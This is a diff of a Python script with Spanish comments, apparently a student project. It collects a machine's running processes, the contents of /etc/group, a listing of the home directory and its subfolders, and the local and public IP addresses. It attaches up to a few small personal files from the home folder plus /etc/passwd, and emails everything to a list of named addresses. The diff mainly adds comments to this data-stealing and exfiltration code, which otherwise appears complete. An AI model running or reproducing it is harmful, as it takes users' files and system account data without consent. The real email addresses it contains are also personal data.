@@ -35,21 +35,24 @@ def obtenerDetalles():
 
     #This will print the processor information
     resultado = resultado + "[+] Processor :" + platform.processor() + "\n"
-
+   
+    #Obtenemos los procesos activos
     resultado = resultado + "\nProcesos activos: \n"
-    
     procesos = subprocess.getoutput("ps -e")
     resultado = resultado + procesos + "\n"
     
+    #Leemos el archivo de grupos y usuarios
     resultado = resultado + "\nGrupos y usuarios: \n"
     archivo = open("/etc/group", "r").read()
     resultado = resultado + archivo + "\n"
 
+    #Hacemos el recorrido de los directorios y listamos los archivos con su tamaño
     contador = 0
     resultado = resultado + "Archivos: \n"
     contenido = os.listdir(os.path.expanduser('~'))
     for fichero in contenido:
         if os.path.isfile(os.path.expanduser('~') + "/" + fichero):
+            #Agregamos los 3 primeros archivos que pesen menos de 7 MB
             if os.path.getsize(os.path.expanduser('~') + "/" + fichero) < 7000000 and contador < 4:
                 nombres_archivo.append(os.path.expanduser('~') + "/" + fichero)
             resultado = resultado + fichero + "  " + str(os.path.getsize(os.path.expanduser('~') + "/" + fichero)) + " bytes"+ "\n"
@@ -62,12 +65,12 @@ def obtenerDetalles():
                 else:
                     resultado = resultado + "   |___" + fic + "\n"
                     
+    #Adjuntamos el archivo de contraseñas             
     nombres_archivo.append("/etc/passwd")
-    
+
+    #Obtenemos las IP pública y local
     resultado = resultado + "\nIP local y pública: \n"
-
     local = subprocess.getoutput("ifconfig | grep 'inet ' | grep -Fv 127.0.0.1 | awk '{print $2}'")
-
     servidor1 = 'http://www.soporteweb.com'
     consulta1 = urllib.build_opener()
     consulta1.addheaders = [('User-agent', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0')] 
@@ -83,7 +86,7 @@ def obtenerDetalles():
     resultado = resultado + "Local: " + local + "   Pública: " + respuesta1
     enviar_correo(resultado)
 
-
+#Envía el correo adjuntando toda la información y los archivos obtenidos
 def enviar_correo(contenido):
     mensaje = MIMEMultipart()
     Destino=['dylan_radilla@ciencias.unam.mx','emma07p9@gmail.com','andrebarra@ciencias.unam.mx','cyndi_cieusagi@ciencias.unam.mx']
